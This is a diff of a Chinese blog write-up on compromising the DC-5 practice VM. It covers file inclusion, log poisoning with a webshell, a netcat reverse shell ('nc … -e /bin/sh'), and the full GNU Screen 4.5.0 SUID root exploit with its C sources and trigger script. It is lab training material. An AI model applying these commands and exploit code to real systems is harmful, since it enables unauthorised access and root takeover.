@@ -20,18 +20,57 @@
     var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="本次学习的是DC-5靶机">
+  <meta name="description" content="本次学习的是DC-5靶机，总结起来这次靶机打起来不算很难，但却浪费了我很多时间，做着做着发现GLIBC版本不一样，于是导致不得不重做一遍，本次靶机涉及文件包含漏洞，一句话木马上传，反弹shell，SUID提权，以及GNU Screen漏洞">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DC-5靶机复现">
 <meta property="og:url" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="知鱼的Blog">
-<meta property="og:description" content="本次学习的是DC-5靶机">
+<meta property="og:description" content="本次学习的是DC-5靶机，总结起来这次靶机打起来不算很难，但却浪费了我很多时间，做着做着发现GLIBC版本不一样，于是导致不得不重做一遍，本次靶机涉及文件包含漏洞，一句话木马上传，反弹shell，SUID提权，以及GNU Screen漏洞">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/0.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/7_1.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/13.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/14.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/15.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/16.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/17.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/18.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/19.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/20.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/21.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/40.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/29.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/23.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/30.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/31.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/27.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/28.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/32.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/33.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/39.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/34.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/35.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/36.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/37.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/38.png">
 <meta property="article:published_time" content="2025-06-06T12:03:02.000Z">
-<meta property="article:modified_time" content="2025-06-08T05:47:06.697Z">
+<meta property="article:modified_time" content="2025-06-08T14:16:26.525Z">
 <meta property="article:author" content="zh1yu">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/0.png">
 
 <link rel="canonical" href="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">
 
@@ -191,7 +230,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-08 13:47:06" itemprop="dateModified" datetime="2025-06-08T13:47:06+08:00">2025-06-08</time>
+                <time title="修改时间：2025-06-08 22:16:26" itemprop="dateModified" datetime="2025-06-08T22:16:26+08:00">2025-06-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -214,27 +253,116 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p> 本次学习的是DC-5靶机</p>
+        <p> 本次学习的是DC-5靶机，总结起来这次靶机打起来不算很难，但却浪费了我很多时间，做着做着发现<strong>GLIBC版本</strong>不一样，于是导致不得不重做一遍，本次靶机涉及文件包含漏洞，一句话木马上传，反弹shell，SUID提权，以及GNU Screen漏洞</p>
 <span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>本次只涉及一个flag</p>
+<p><img src="0.png" alt="图片"></p>
+<p>先把靶机设置为nat模式，否则扫描不到靶机，接着查看靶机mac地址：</p>
+<p><img src="1.png" alt="图片"></p>
+<p>然后扫描靶机ip:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt="图片"></p>
 <p><strong>192.168.130.145</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.130.145</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/etc/passwd</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.130.128 4444 -e /bin/sh</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/41154.sh</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir DC-5</span><br><span class="line">cd DC-5</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim libhax.c</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o libhax.so libhax.c -std=gnu89</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim rootshell.c</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o rootshell.so rootshell.c -std=gnu89</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c -std=gnu89</span><br></pre></td></tr></table></figure>
+<p>dirsearch扫描靶机的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.130.145</span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="图片"></p>
+<p>我们去web端查看有没有漏洞，发现一个类似留言板的页面，但没有xss</p>
+<p><img src="4.png" alt="图片"></p>
+<p>后面发现每次一刷新页面，下面的copyright数字就会改变：</p>
+<p><img src="5.png" alt="图片"></p>
+<p>我们发现这其实一个文件：<strong>footer.php</strong>，之所以会因为刷新而改变这个页面的数字，猜测这个页面文件被包含到了其他页面中</p>
+<p><img src="6.png" alt="图片"></p>
+<p>我们对<code>thankyou.php</code>页面添加一个file的参数，内容就是<code>/etc/passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="7.png" alt="图片"></p>
+<p>有回显，我们的猜测是正确的，既然如此，我们把file的内容改成一句话木马：</p>
+<p><img src="7_1.png" alt="图片"></p>
+<p>该一句话木马会被日志文件记录，nginx的日志文件一般在<code>/var/log/nginx/access.log</code>，我们查看其内容</p>
+<p><img src="8.png" alt="图片"></p>
+<p>回显的内容太多了，直接用蚁剑尝试连接（因为日志文件可以解析一句话木马，所以才能连接成功），ps：kali好像不自带蚁剑，可以自行查找文章下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.145/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p><img src="9.png" alt="图片"></p>
+<p>成功连接</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>连接成功后，我们尝试反弹shell，先开一个终端开启监听，然后nc反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line">nc 192.168.130.128 4444 -e /bin/sh</span><br></pre></td></tr></table></figure>
+<p><img src="11.png" alt="图片"></p>
+<p><img src="10.png" alt="图片"></p>
+<p><img src="12.png" alt="图片"></p>
+<p>反弹成功后，切换到交互式shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>我们拿到的肯定不是root权限，查找有没有suid提权的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="13.png" alt="图片"></p>
+<p>发现有个screen -4.5.0命令，而screen -4.5.0是存在漏洞的，先攻略下screen -4.5.0是什么：</p>
+<p><strong>Screen 4.5.0</strong> 是 <strong>GNU Screen</strong> 终端复用工具的一个旧版本。GNU Screen 是一个允许用户在单个终端会话中管理多个虚拟终端的工具，常用于远程服务器管理、长时间运行任务（如模型训练、编译等）以及会话恢复。</p>
+<h3 id="GNU-Screen漏洞"><a href="#GNU-Screen漏洞" class="headerlink" title="GNU Screen漏洞"></a>GNU Screen漏洞</h3><p>我们使用searchsploit 查找与此相关的漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+<p><img src="14.png" alt="图片"></p>
+<p>我们读取第一个sh脚本的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/exploitdb/exploits/linux/local/41154.sh</span><br></pre></td></tr></table></figure>
+<p><img src="15.png" alt="图片"></p>
+<p>按照上面的操作一步一步来：我们先在当前用户目录下新增一个DC-5文件夹，然后切换到该文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> DC-5</span><br><span class="line"><span class="built_in">cd</span> DC-5</span><br></pre></td></tr></table></figure>
+<p><img src="16.png" alt="图片"></p>
+<p>然后创建<code>libhax.c</code>文件进行添加内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim libhax.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="17.png" alt="图片"></p>
+<p>但是接着gcc编译的过程的报错了</p>
+<p><img src="18.png" alt="图片"></p>
+<p>查资料是因为gcc的版本较高导致的，所以需要在后面添加<code>-std=gnu89</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br><span class="line">gcc -fPIC -shared -o libhax.so libhax.c -std=gnu89</span><br></pre></td></tr></table></figure>
+<p><img src="19.png" alt="图片"></p>
+<p><img src="20.png" alt="图片"></p>
+<p>下一步我们需要生成<code>rootshell.c</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim rootshell.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="21.png" alt="图片"></p>
+<p>在进行下一步编译之前先查看<strong>GLIBC_</strong>的版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC_</span><br></pre></td></tr></table></figure>
+<p><img src="40.png" alt="图片"></p>
+<p>如果你的最下面的版本大于<strong>2.18</strong>就先<strong>不要按照我下面错误的方式做</strong>，下面是我做错的，走了许多弯路</p>
+<h4 id="错误："><a href="#错误：" class="headerlink" title="错误："></a>错误：</h4><p>如果不想看，可以直接跳转到正确的目录下</p>
+<p>因为我不知道GLIBC_版本会导致问题，所以我还是照上面一样编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c -std=gnu89</span><br></pre></td></tr></table></figure>
+<p><img src="29.png" alt="图片"></p>
+<p>接着生成dc5.sh脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim dc5.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+<p>保存文件之前先输入<code>:set ff=unix</code>,防止脚本格式错误</p>
+<p><img src="23.png" alt="图片"></p>
+<p>我们可以查看生成的dc5.sh的格式，是<code>ascii text</code>就没问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file dc5.sh</span><br></pre></td></tr></table></figure>
+<p><img src="30.png" alt="图片"></p>
+<p>接着我们删掉没用的文件</p>
+<p><img src="31.png" alt="图片"></p>
+<p>然后我们返回蚁剑在<code>/tmp</code>目录上传文件，这里是右键上传：</p>
+<p><img src="27.png" alt="图片"></p>
+<p>接着进入<strong>靶机shell</strong>，切换到<strong>/tmp</strong>目录：</p>
+<p><img src="28.png" alt="图片"></p>
+<p>然后给dc.5.sh文件添加<strong>全部控制权限</strong>，然后执行该脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 dc5.sh</span><br><span class="line">./dc5.sh</span><br></pre></td></tr></table></figure>
+<p><img src="32.png" alt="图片"></p>
+<p>没错，你没看错，没有提权成功，原因就是因为我是用高版本的GLIBC_对<code>rootshell</code>文件编译导致产生了问题，解决的办法就是，<strong>把rootshell.c文件先上传到蚁剑上面，然后在靶机shell中进行编译</strong>，这样生成的rootshell文件就绝对没问题</p>
+<p>我们看下靶机和kali上各自GLIBC_的版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC_</span><br></pre></td></tr></table></figure>
+<p><img src="33.png" alt="图片"></p>
+<p>于是我想先把上传的rootshell文件给删了，但意外又产生了，没有权限！！！</p>
+<p><img src="39.png" alt="图片"></p>
+<p>没办法，只能把靶机删掉，重新安装😭😭😭</p>
+<h4 id="正确："><a href="#正确：" class="headerlink" title="正确："></a>正确：</h4><p>下面是正确的做法：</p>
+<p>我们在kali中生成rootshell.c文件后，不要进行编译！！！，<strong>libhax.c可以在kali上编译，dc5.sh还是和上面一样的生成方式</strong></p>
+<p><img src="34.png" alt="图片"></p>
+<p>然后把这三个文件上传到蚁剑中靶机的<strong>/tmp</strong>目录下：</p>
+<p><img src="35.png" alt="图片"></p>
+<p>然后进入到靶机shell的/tmp目录下：</p>
+<p><img src="36.png" alt="图片"></p>
+<p>我们继续给dc5.sh添加权限，然后执行：</p>
+<p><img src="37.png" alt="图片"></p>
+<p>这次终于成功了</p>
+<p>然后寻找flag文件，查看flag内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br><span class="line"><span class="built_in">cat</span> /root/thisistheflag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="38.png" alt="图片"></p>
 
     </div>
 
@@ -335,6 +463,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GNU-Screen%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.</span> <span class="nav-text">GNU Screen漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%EF%BC%9A"><span class="nav-number">3.1.1.</span> <span class="nav-text">错误：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E7%A1%AE%EF%BC%9A"><span class="nav-number">3.1.2.</span> <span class="nav-text">正确：</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
